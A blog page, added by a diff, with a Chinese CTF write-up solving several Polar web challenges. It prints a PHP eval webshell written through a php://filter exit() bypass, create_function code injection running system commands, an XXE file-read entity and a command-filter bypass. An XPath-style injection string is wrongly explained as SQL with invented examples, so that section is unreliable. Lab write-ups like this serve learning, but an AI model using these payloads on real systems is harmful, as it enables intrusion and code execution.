@@ -1,0 +1,1472 @@
+
+<!DOCTYPE html><html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 8.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>Polar中等 - Yu9991n9的博客</title>
+
+  
+    <meta name="description" content="到底给不给flag呢进入题目看见源码  这里有变量覆盖漏洞，直接漏洞利用 这里有个条件，flag的传参get和post不能都不传参，不热就会退出 这里的get的变量覆盖就比如?b&#x3D;a 那么就会变成：$B&#x3D;$a 利用这个变量漏洞，一开始我传的?flag&#x3D;a&amp;a&#x3D;flag但是这个顺序是错的，foreach循环按照传参先后顺序来，也就是说第一遍时变成了$f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Polar中等">
+<meta property="og:url" content="https://yu9991n9.github.io/2026/01/25/polar%E4%B8%AD%E7%AD%89/">
+<meta property="og:site_name" content="Yu9991n9的博客">
+<meta property="og:description" content="到底给不给flag呢进入题目看见源码  这里有变量覆盖漏洞，直接漏洞利用 这里有个条件，flag的传参get和post不能都不传参，不热就会退出 这里的get的变量覆盖就比如?b&#x3D;a 那么就会变成：$B&#x3D;$a 利用这个变量漏洞，一开始我传的?flag&#x3D;a&amp;a&#x3D;flag但是这个顺序是错的，foreach循环按照传参先后顺序来，也就是说第一遍时变成了$f">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://yu9991n9.github.io/images/avatar.jpg">
+<meta property="article:published_time" content="2026-01-25T11:24:00.000Z">
+<meta property="article:modified_time" content="2026-08-20T17:10:29.010Z">
+<meta property="article:author" content="Yu9991n9">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yu9991n9.github.io/images/avatar.jpg">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yu9991n9","sameAs":[],"image":"/images/avatar.jpg"},"dateCreated":"2026-01-25T19:24:00+08:00","dateModified":"2026-08-21T01:10:29+08:00","datePublished":"2026-01-25T19:24:00+08:00","description":"","headline":"Polar中等","mainEntityOfPage":{"@type":"WebPage","@id":"https://yu9991n9.github.io/2026/01/25/polar%E4%B8%AD%E7%AD%89/"},"publisher":{"@type":"Organization","name":"Yu9991n9","sameAs":[],"image":"/images/avatar.jpg","logo":{"@type":"ImageObject","url":"/images/avatar.jpg"}},"url":"https://yu9991n9.github.io/2026/01/25/polar%E4%B8%AD%E7%AD%89/","image":[]}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/images/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Yu9991n9的博客</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="Search"></form><div id="search-result"></div><div class="search-no-result">No Results!</div></div>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">Recent Update</span></div><div class="widget-body fs14"><a class="item title" href="/2026/03/26/polar%E5%9B%B0%E9%9A%BE/"><span class="title">Polar困难</span></a><a class="item title" href="/2026/01/25/polar%E4%B8%AD%E7%AD%89/"><span class="title">Polar中等</span></a><a class="item title" href="/2026/03/12/%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87-wakeup/"><span class="title">各版本绕过_wakeup()</span></a><a class="item title" href="/2026/03/08/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="title">session 文件包含</span></a><a class="item title" href="/2026/03/02/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/"><span class="title">[CISCN2019 华北赛区 Day1 Web1]Dropbox</span></a><a class="item title" href="/2026/03/02/hello-world/"><span class="title">Hello World</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">Posted on: <time datetime="2026-01-25T11:24:00.000Z">2026-01-25</time></span><span class="sep updated"></span><span class="text updated">Updated on: <time datetime="2026-08-20T17:10:29.010Z">2026-08-21</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>Polar中等</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="到底给不给flag呢"><a href="#到底给不给flag呢" class="headerlink" title="到底给不给flag呢"></a>到底给不给flag呢</h1><p>进入题目看见源码</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260125192425826.png" alt="image-20260125192425826"></p>
+<p>这里有变量覆盖漏洞，直接漏洞利用</p>
+<p>这里有个条件，flag的传参get和post不能都不传参，不热就会退出</p>
+<p>这里的get的变量覆盖就比如?b&#x3D;a</p>
+<p>那么就会变成：$B&#x3D;$a</p>
+<p>利用这个变量漏洞，一开始我传的?flag&#x3D;a&amp;a&#x3D;flag但是这个顺序是错的，foreach循环按照传参先后顺序来，也就是说第一遍时变成了$flag&#x3D;$a,而且这里$a是空的，相当于这里的flag变成null了，然后第二次就更变了</p>
+<p>正确的是?a&#x3D;flag&amp;flag&#x3D;a</p>
+<p>一开始把flag的原始值存给a才是对的，然后再还回来</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260125190752370.png" alt="image-20260125190752370"></p>
+<h1 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h1><p>进入题目看了下，上网搜了一下这里有一个死亡绕过</p>
+<p>因为这里默认前面就被拼接了一个&lt;?php exit()导致后面的脚本无法运行，那我们就需要想办法让这个exit()生效</p>
+<p>这里想到的就是base64解码<strong>使用base64解码将<code>&lt;?php exit();?&gt;</code>中的非base64编码字符去掉</strong>这样<code>&lt;?php exit();?&gt;</code>就变成了<code>phpexit</code>，并不是<code>php</code>脚本文件格式，无法被识别执行</p>
+<p>利用base64解码的容错性，将<code>&lt;?php exit();?&gt;</code>中的<code>&lt;&gt;?;()</code>和空格都当做不可识别字符忽略，此时base64函数只会对<code>phpexit</code>进行解码</p>
+<p>编码过后这里的特殊符号都会失效，我们就实现了绕过，但是我们任然需要写入马</p>
+<p>这里的问题是：<strong>base64解码是需要4字节对齐的，没有被考虑</strong></p>
+<p><code>phpexit</code>被解码的时候，因为是7个字符，所以<strong>借用</strong>了一句话木马编码的第一个字符。</p>
+<p>木马编码被破坏，自然无法正确解码。解决方案很简单，在编码后的一句话马前加上一个无用字符借给<code>phpexit</code>即可</p>
+<p>那么我们的payload还得有一个无用的字符放在开头拿来给编码用</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260125193741893.png" alt="image-20260125193741893"></p>
+<p>?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.php</p>
+<p>content&#x3D;aPD89QGV2YWwoJF9QT1NUWzFdKTs&#x2F;Pg&#x3D;&#x3D; （&#96;<strong><?=@eval($_POST[1]);?></strong>）</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260125193520373.png" alt="image-20260125193520373"></p>
+<p>然后进蚁剑拿到flag</p>
+<h1 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h1><p>点一下发现id的值变了，也就是说这里的注入点是id</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260125195533048.png" alt="image-20260125195533048"></p>
+<p>然后就没有什么头绪了，后面看了下网上的payload学到了一种新的方法</p>
+<p>这道题的payload是**?id&#x3D;’]|&#x2F;&#x2F;*|&#x2F;&#x2F;*[‘**</p>
+<p>输入’]|&#x2F;&#x2F;<em>|&#x2F;&#x2F;</em>[‘可拆分为’]、|、&#x2F;&#x2F;*、&#x2F;*等关键片段，每个片段在注入中承担不同功能：</p>
+<p>（1） ‘]：闭合引号，破坏语句结构</p>
+<p>假设原始SQL语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;用户输入&#x27; AND password = &#x27;xxx&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>当用户输入包含’]时，拼接后的语句变为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;&#x27; ]|//*|//*[&#x27; AND password = &#x27;xxx&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这里的’]会闭合前面的单引号（’），导致WHERE子句的条件变为username &#x3D; ‘’（空字符串），后续的]成为未闭合的符号，破坏语句的语法结构。</p>
+<p>(2) |：逻辑或&#x2F;按位或运算符（视数据库而定）</p>
+<p>在部分数据库（如SQL Server）中，|是按位或运算符；但在注入场景中，可能被利用为逻辑或（OR）。例如，若数据库将|解析为逻辑或，则拼接后的语句可能变为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;&#x27; OR 1=1 /* ...</span><br></pre></td></tr></table></figure>
+
+<p>此时OR 1&#x3D;1构造恒真条件，使查询返回所有用户（绕过密码验证）。</p>
+<p>(3) &#x2F;&#x2F;<em>与&#x2F;</em>：注释符，忽略后续代码</p>
+<p>&#x2F;*是SQL的块注释符（从&#x2F;<em>到</em>&#x2F;之间的内容被忽略），&#x2F;&#x2F;是行注释符（部分数据库如MySQL支持）。输入中的&#x2F;&#x2F;*和&#x2F;*可能组合成注释，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;&#x27; ]| 1=1 /* ...</span><br></pre></td></tr></table></figure>
+
+<p>注释符会忽略&#x2F;*之后的所有内容（如原语句的AND password &#x3D; ‘xxx’），使数据库仅执行SELECT * FROM users WHERE username &#x3D; ‘’ ]| 1&#x3D;1。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/49937241/1753349083361-f1df3ed0-4b7a-4654-a991-ebe87bc1b94b.png" alt="img"></p>
+<h1 id="某个函数的复仇"><a href="#某个函数的复仇" class="headerlink" title="某个函数的复仇"></a>某个函数的复仇</h1><p>进题看源码</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260128202315625.png" alt="image-20260128202315625"></p>
+<p>这里的第一个正则：<br>^就是开头的意思，a-z自然就是字母，*的意思就是前面东西可以出现任意次数，0次1次多次等,然后就是$，一个类似于^的东西，但是他的意思是结尾，i就是忽略大小写</p>
+<p>s的意思就是可以让点去匹配换行符，但是这里是没有点的，在这里是没有什么实际作用的，但是在一些特定的情况下是会有的</p>
+<p>场景：过滤 <code>&lt;script&gt;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$input = $_POST[&#x27;data&#x27;];</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#x27;/&lt;script&gt;.*&lt;\/script&gt;/&#x27;, $input)) &#123;</span><br><span class="line">    echo &quot;安全&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">alert(1)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>❌ 没有 <code>s</code> 的结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;.*&lt;/script&gt;</span><br><span class="line">         ↑</span><br><span class="line">         . 匹配不到换行</span><br></pre></td></tr></table></figure>
+
+<p>👉 <code>.*</code> 在 <code>&lt;script&gt;</code> 后面就停了<br> 👉 整个正则失败<br> 👉 <strong>绕过成功</strong></p>
+<p>✅ 加上 <code>s</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/&lt;script&gt;.*&lt;\/script&gt;/s&#x27;, $input);</span><br></pre></td></tr></table></figure>
+
+<p>现在：</p>
+<ul>
+<li><code>.</code> 能匹配换行</li>
+<li><code>.*</code> 能把中间所有内容吃完</li>
+</ul>
+<p>👉 攻击被拦住</p>
+<p>然后就是D，简单理解为这个是用来防止你为了通过换行这条路去绕过的</p>
+<p>正则看了这个题就很简单了，只不过还是差经验，面对这种第一个参数是空的情况第一下想到命令执行那一块去了，但是这里要想到的应该是用creat_function这个函数</p>
+<ul>
+<li>它有两个参数第一个参数用作参数列表，意思是这个创建的匿名函数里面有哪些参数</li>
+<li>第二个就是指令</li>
+</ul>
+<p>那么这里大概知道了传creat_function之后，关于要给root的传参还需要仔细地去构造</p>
+<p>正常来说我们传参了creat_function过后那么后台就会生成一个类似于这样的代码：</p>
+<p>function () {<br>    $root;<br>}</p>
+<p>并且creat_func这个函数只是创建函数而不是调用函数，也就是说我们还要想办法去执行代码，那么我们这里就可以去主动闭合掉function的{从而实现逃逸，然后再用&#x2F;*去注释掉后面多的部分</p>
+<p>?root&#x3D;;}system(‘more &#x2F;f*’);&#x2F;星号</p>
+<p>cat被ban了就more嘛，f后面跟一个通配符；</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260128204244984.png" alt="image-20260128204244984"></p>
+<h1 id="XXe"><a href="#XXe" class="headerlink" title="XXe"></a>XXe</h1><p>这里要用到的是一个之前做题不是很常用到的知识，xxe</p>
+<p>XXE：全称为XML Enternal Entity Injection，中文名称：XML外部实体注入。</p>
+<p>XXE漏洞原理</p>
+<p><strong>漏洞成因：解析时未对XML外部实体加以限制，导致攻击者将恶意代码注入到XML中，导致服务器加载恶意的外部实体引发文件读取，SSRF，命令执行等危害操作。</strong></p>
+<p>特征：在HTTP的Request报文出现一下请求报文，即表明此时是采用XML进行数据传输，就可以测试是否存在XML漏洞。</p>
+<blockquote>
+<p>Content-type:text&#x2F;xml application&#x2F;xml</p>
+</blockquote>
+<p>XML<br>简单了解XML：</p>
+<p>XML 指可扩展标记语言（EXtensible Markup Language）<br>XML 是一种标记语言，很类似 HTML<br>XML 被设计为传输和存储数据，其焦点是数据的内容 XML 被设计用来结构化、存储以及传输信息<br>XML 允许创作者定义自己的标签和自己的文档结构语法：</p>
+<ul>
+<li>XML元素都必须有关闭标签。</li>
+<li>XML 标签对大小写敏感。</li>
+<li>XML 必须正确地嵌套。</li>
+<li>XML 文档必须有根元素。</li>
+<li>XML 的属性值须加引号。</li>
+</ul>
+<p>结构：</p>
+<ul>
+<li>XML 文档声明，在文档的第一行</li>
+<li>XML 文档类型定义，即DTD，XXE 漏洞所在的地方</li>
+<li>XML 文档元素</li>
+</ul>
+<p>xxe文件读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line"> &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flagggg.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+<p>换成要读取的文件就可以了</p>
+<p>这里题目名称就叫xxe，然后还提示我们flag的位置</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260128213133970.png" alt="image-20260128213133970"></p>
+<p>找到了flag但是是个假的</p>
+<p>然后用dirsearch扫了一下发现了有个dom.php</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260128213225795.png" alt="image-20260128213225795"></p>
+<p>  这个警告信息表明在 &#x2F;var&#x2F;www&#x2F;html&#x2F;dom.php 文件的第 5 行， DOMDocument::loadXML() 方法接收到了一个空字符串作为输入。 DOMDocument::loadXML() 方法用于加载 XML 数据，如果传入的字符串为空，就会触发这个警告</p>
+<p> 这句话的意思是：</p>
+<blockquote>
+<p>你的<code>dom.php</code>文件第 5 行，想让 PHP 解析一段 XML 内容，但你给它传的 “XML 内容” 是空的（啥都没有），PHP 没法解析空内容，所以弹出这个警告，并且 XML 解析的逻辑会失败（比如 XXE 漏洞利用不了、XFA 解析失败）。</p>
+</blockquote>
+<p>所以我们就在这里使用xxe</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260128214004735.png" alt="image-20260128214004735"></p>
+<p>解码拿到flag</p>
+<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>进题看见源码</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260128220321620.png" alt="image-20260128220321620"></p>
+<p>正常写了pop链之后ls一下没发现flag，这里就要用find命令来找一下</p>
+<p>星号flag星号意思就是包含任意只要带有flag的目录，但是这里的双引号要转义，如果不转义会粗问题，php会把最先遇见的两个双引号闭合，那么这里命令就失效了</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260128222733063.png" alt="image-20260128222733063"></p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260128221717248.png" alt="image-20260128221717248"></p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260128221836746.png" alt="image-20260128221836746"></p>
+<h1 id="blackmagic"><a href="#blackmagic" class="headerlink" title="blackmagic"></a>blackmagic</h1><p>进入题目点进magic.php然后没看见什么东西，打开源码看见了这一串</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260128233041402.png" alt="image-20260128233041402"></p>
+<p>这里相当于会对flag的原始内容进行一些过滤，从trim哪里就能知道黑名单是strCharlist，里面有\r()\n\0\x0b</p>
+<p>分别是回车，换行，空字符，垂直制表符，这里直接写一个脚本跑出过滤之后的strcontent就可以了，然后传给strTmp</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260128232940410.png" alt="image-20260128232940410"></p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260128232319088.png" alt="image-20260128232319088"></p>
+<h1 id="再来ping一波啊"><a href="#再来ping一波啊" class="headerlink" title="再来ping一波啊"></a>再来ping一波啊</h1><p>这里一开始让你传，试了下一些常规的被屏蔽了，然后这里用的变量拼接绕过</p>
+<p>;a&#x3D;ind;b&#x3D;ex;ta\c$IFS$9$a$b.php</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260128235423979.png" alt="image-20260128235423979"></p>
+<h1 id="代码审计1（php原生类）"><a href="#代码审计1（php原生类）" class="headerlink" title="代码审计1（php原生类）"></a>代码审计1（php原生类）</h1><p>进来一看没有什么头绪，了解了一下这里要用php原生类</p>
+<p>看的资料是csdn上的<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44640313/article/details/134310900">https://blog.csdn.net/qq_44640313/article/details/134310900</a></p>
+<p><strong>PHP原生类就是在标准PHP库中已经封装好的类</strong>，而在其中，有些类具有一些功能，例如<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96&spm=1001.2101.3001.7020">文件读取</a>、目录遍历等，这就给了我们可乘之机，我们只需要实例化这些类，就可以实现文件读取这种敏感操作。</p>
+<p>一些奇怪的题，比如没有给出反序列化的类，这个时候可能就需要用到PHP原生类了</p>
+<p>这个题就是典型的要利用php原生类来做，看见new那里就想到了要利用类来做，可是这里没给你其他的类的内容，那这里就只能用php原生类来做了</p>
+<p>这里要利用的是Splfileobject类，可以用于对文件内容的遍历、查找、操作等</p>
+<p>该类的构造方法可以构造一个新的文件对象用于后续的读取。其大致原理可简单解释一下，当类中<code>__tostring</code>魔术方法被触发时，如果类中内容为存在文件名，那么它会对此文件名进行内容获取。但是需要注意的是这样直接读取文件只会读取一行数据</p>
+<p>所以这里吧sys赋值成Splfileobject然后这里已经包含了flag了把xsx赋值一个伪协议就可以了</p>
+<p><img src="/images/ctf/polar%E4%B8%AD%E7%AD%89/image-20260129220021548.png" alt="![img](data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEUgAABioAAANXCAIAAAAkQJDNAAAgAElEQVR4nOzde2AU5bk&#x2F;8Gdm9pLdXFhIQBASIrcECRKwrVXiJRSkbWjCofpbUPBUPEC1Kr0oaK0NOVYpsbZNRTlIwVOIwFYOJampxlBRTLy0AgkkkHCJIQnIJZfNbTfZ3Zn5&#x2F;THJZPaaTbKbm9&#x2F;PHza7MzvzzuwuzXzzvM8wVqtVFEVBEHiedzgcDodj8+bNmzZtIgAAAAAAAAAAgN545tlfrl33Y5VKxXEqFcexHMswrErsIidQgz1OAAAAAAAAAAAYrux2B8MwDMMKLEMCw7JCd&#x2F;wk4Xl+sAcJAAAAAAAAAADDUohWM3pUmFarVavVKpWK4ziWZVkikkqfZIM9TgAAAAAAAAAAGK74LoIgSNVOrLL0qdfxU2l6osGQmF7a0zpGU09PDRST0eCya5PR4PqUclnX0ZmMBg8G6SiIyPdZLE1P9DRcZz28ccHg17i8nVaTcVDPt4vS9ETlCVR8VJTPuY3Y03MDxvOH2OvHoqd3axA+QJ1H4XLme&#x2F;zoeH0xAAAAAAAABIEcPMmlTqwye5J+6MX2EjKKC9dTVpKPa77St3OqFi8zEvl15W0ydl3Uul0pJ6aXlqYn9u&#x2F;avTR9c8X6QpNReWG9Lp+I8td5uqY2HcyPTbs&#x2F;oeth7PpCs0Lh+tjeDJ76NXoPSUBSVpVy3E7DT8goNruM1WX0ZrO5OCNBsQdp9Ie8BIqdg+8+xL5zH4gbk7FPW3Y6w05nTHqy358fH7ue9fz2uKwkp0+PcV2+0yfLkJie7uE5xQu8fX7kMffz&#x2F;BtNzue5cH2s+9vh&#x2F;LFYvN3Le7R9sftJ6P6QeGJ8pV&#x2F;nX34&#x2F;1+VTVVaS8vRJx1C4PpY6&#x2F;6kht3Pox1lzPv9uL1B8egLxNQAAAAAAABjBBGed1U9EpKyB8vF6D9eUSVlV5CEFkUOA7vSp9HRF7PrnfQULJuO6&#x2F;MXbuy9&#x2F;na6MizMSEjKKty&#x2F;OX9f3CGdlTlq2vHVPF9ZdkZJ07dp9nZuYfpq6r3kVR+7&#x2F;4Klfo3fJkwrXx8YuXhxLsbGusVLnAFwuvpOyqlxG73JF3jX6pfenxVJVztuul95v51TR4mVGo6lwPWWtDNiVt886ONcYY12+2wdN+drS9JVZtL7QZJRempQVJ7&#x2F;BhfGbjSbq3zvgW0JCgtFkNm+P6zw5pemJ6&#x2F;IXb3eO&#x2F;Z4tz6pYX2g2b1&#x2F;c&#x2F;eGTPzBePz+F62Pz13UeaaDPf8&#x2F;cv9rd74Yz+fzLIVfh+ljl18z0i36df&#x2F;kbsH1x98npPl8mY1JW3Han4FJey0NU5sb1&#x2F;Psy8G8DAAAAAADAsKIMnjon3zW3tjW1tDa3trW0tTW3tDa3ttm93&#x2F;yu+&#x2F;rPQ3bjVErReRloeiFLTp&#x2F;ezumKQJzrdrpSkNL0zfk95FNExufXx+Zv7st1X1f4ZDIaDIkvlPte2WhyDQkyTG4HbFaU6fg1+H6MXsFkNBhWUnbx8&#x2F;FEcc8WZ9NKDyUlijoXjyUuzpfuitEneMqfTC9kVXUtz3h2cVXWCwM0fcxp3C4fO5fqM9MLWVWLn+0M3w7m02JFFJGQUdz5oD&#x2F;vgHMc5iHRM5qMJnNxRgKVpq&#x2F;MittuNhkTMoqfLV+ZXioFbevypQEaTeZlB52rZ3x8fhIynl1MVHG6VH40cOe&#x2F;F9VPyvPvXSDOv6L6SfG5N5rM22mdr6Ikk9H5xcoE1r&#x2F;vb7eBfhsAAAAAAACGFXnanTzfjhVFkUSxs&#x2F;yJRFH0o&#x2F;fTrPjY&#x2F;IOuV16lb+dUKaeqkXRN1&#x2F;Wz6YUsUtRzKC5rO1OQ0rdz&#x2F;Lh8la773KpzeianX+vyY9dnPx&#x2F;vua6ju6KpNH1zxfrnqbNTjI+mOUaT&#x2F;4Pv8+gl0igOLnOaIJWQUWw2LzuovJZ2y0lcC7d8jT4h49nFLvmT6WA+db+1xufXe3j7+3AgbkGkcyLQy00edIkPuvIaF&#x2F;14B5ynrrnMZyxcHxsbP0veSbGcTBpNxfe&#x2F;nWhIykkrNBfGb+48PqPJqc6m589P3M1dCwNw&#x2F;nvB3+ont&#x2F;PvRQDOvyKGdJ6laTRtd8qE5E+9NFajyfnFigDN3++vcmcD+jYAAAAAAAAMK8rgqXPyHRGJTpPv&#x2F;NhMQsazi11LGDxcwJleUIY5+b4v70rfzqnqvn73ZVZ8bB+uXxMyirtyr84Lfy91HdJS0wtZpMjSjCbnyEwRopmMvRl8H0cvNb45SIupOxBQRjfr8qnrajsxvbQ7J&#x2F;Fa+dTF0+iNy5zzJ+f0iSjh5jjq34W3PEDlPCpPJTV+Mx3MVyY0yxZTVVaS5ySrj+9AD8rKqzw9bTIaDIaVlC3PvzR7qlbz+fkxGdc5Jzv9P&#x2F;+94Gf1k&#x2F;P596mv59+oCL7kUKzrLX7b2LVIcR49TL4rPV2h3GbnkHvx&#x2F;e02oG8DAAAAAADAsOJS&#x2F;dTV+0kURSK5CsqfDRmfX09OU09ML2SRc&#x2F;GDybguf&#x2F;H6zglSZeVV3U2BPSorr3K7flXW7HRHCQn3p8VWlZf5M0wXphdy0gq7CyYOei5pSkwvJdNBaY5O11SdxPQycq0EUfR+8n&#x2F;wfR19RrHZbDYt8964Ww5yFFU1JqOPyqfuMbmN3jl&#x2F;ck2fpOVeiov84GdKQUQu7bZcej8pe2+Vnq4gpwTNZN6+uDuPc9pm3z8&#x2F;PXA+MKnCa3P8+sXOR5GUVUWL6aDBoAihfH5+1uXHrs92Sm77d&#x2F;57x7&#x2F;qJ9fz70tfz7&#x2F;J7NZNqvvTfr&#x2F;J9ZkeKZKonr6&#x2F;bp83IhrYtwEAAAAAAKDfmpqaArKOP0Q37tVP&#x2F;t35LiHj2e4mwqXpiesqXC6RS09XLN5uur&#x2F;zkdHkx93M3K5flVGLy1VlHy77TMZ1+V2BxNvlVbHx8RS7vtBcuD528XZz1&#x2F;901kko5vnEri80m4szZpFrJYhz76HeDL4&#x2F;F63eptG5dYI2GQ3r8r1Vr7hWGbmMXpk&#x2F;mQ7mk4fCtYAEOKWnK3ykUUaTubDQaXqbr95PrhsydsUVVVlJ7s2x+vAOJLqlEcr3Qs7Gum5yuI62m701DTOZTGazuTB+c3c45uPzU5iW434EQQnQPPD&#x2F;zne9iRX79v3trCNTNFxL7O635YHL5DsiorJyL2VOPr+&#x2F;Hj9v0i4G6G0AAAAAAIAhzMsf7Z0M9hiJi